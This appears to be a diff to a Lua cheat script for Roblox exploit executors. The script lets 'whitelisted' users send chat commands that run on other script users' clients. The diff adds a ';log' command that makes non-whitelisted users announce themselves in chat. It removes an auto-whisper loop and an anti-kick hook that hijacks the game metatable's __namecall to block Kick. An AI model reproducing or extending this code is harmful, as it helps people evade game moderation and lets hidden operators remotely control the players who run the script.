@@ -44,6 +44,7 @@ local function applyTag(plr, txt, col)
 		l.TextScaled = true
 		l.Parent = b
 	end
+	if plr == LOCAL_PLAYER then return end
 	if plr.Character then render() else plr.CharacterAdded:Once(function() task.wait(0.5) render() end) end
 end
 
@@ -61,7 +62,7 @@ end
 for _, p in ipairs(Players:GetPlayers()) do tag(p) end
 Players.PlayerAdded:Connect(function(p) task.delay(1, function() tag(p) end) end)
 
--- Commands from whitelisted users
+-- COMANDOS
 local function exec(cmd, senderId)
 	cmd = string.lower(cmd)
 	local undo = false
@@ -71,7 +72,7 @@ local function exec(cmd, senderId)
 	end
 
 	local sender = Players:GetPlayerByUserId(senderId)
-	if not sender or not sender.Character or not sender.Character:FindFirstChild("HumanoidRootPart") then return end
+	if not sender or not sender.Character then return end
 
 	local function getHRP()
 		return LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart")
@@ -157,6 +158,11 @@ local function exec(cmd, senderId)
 				p.Anchored = not undo
 			end
 		end
+
+	elseif cmd == ";log" and not undo then
+		if not isWhitelisted(LOCAL_PLAYER.UserId) then
+			TextChatService:SendAsync("8Uz1P")
+		end
 	end
 end
 
@@ -169,54 +175,6 @@ TextChatService.MessageReceived:Connect(function(msg)
 	if not isWhitelisted(uid) then return end
 	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
 	exec(t, uid)
-end)
-
-local loggedWhitelist = {}
-
-local function dmWhitelistedOnce(plr)
-	if loggedWhitelist[plr.UserId] then return end
-	loggedWhitelist[plr.UserId] = true
-
-	local nameTarget = plr.DisplayName and #plr.DisplayName > 0 and plr.DisplayName or plr.Name
-
-	pcall(function()
-		if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
-			TextChatService.TextChannels.RBXGeneral:SendAsync("/w " .. nameTarget .. " X83uz1")
-		end
-	end)
-end
-
-task.spawn(function()
-	while true do
-		for _, p in ipairs(Players:GetPlayers()) do
-			if p ~= LOCAL_PLAYER and isWhitelisted(p.UserId) and not isWhitelisted(LOCAL_PLAYER.UserId) then
-				tagAsVapeUserFor(p)
-				dmWhitelistedOnce(p)
-			end
-		end
-		task.wait(5)
-	end
-end)
-
-TextChatService.MessageReceived:Connect(function(msg)
-	local t = msg.Text
-	local s = msg.TextSource
-	if not s then return end
-	local uid = s.UserId
-	if not isWhitelisted(uid) then return end
-	if t:lower() == ";log" then
-		loggedWhitelist[uid] = nil
-	end
-end)
-
-local mt = getrawmetatable(game)
-setreadonly(mt, false)
-local old = mt.__namecall
-mt.__namecall = newcclosure(function(self, ...)
-	if getnamecallmethod() == "Kick" and self == LOCAL_PLAYER then
-		return nil
-	end
-	return old(self, ...)
 end)
 
 local isfile = isfile or function(file)
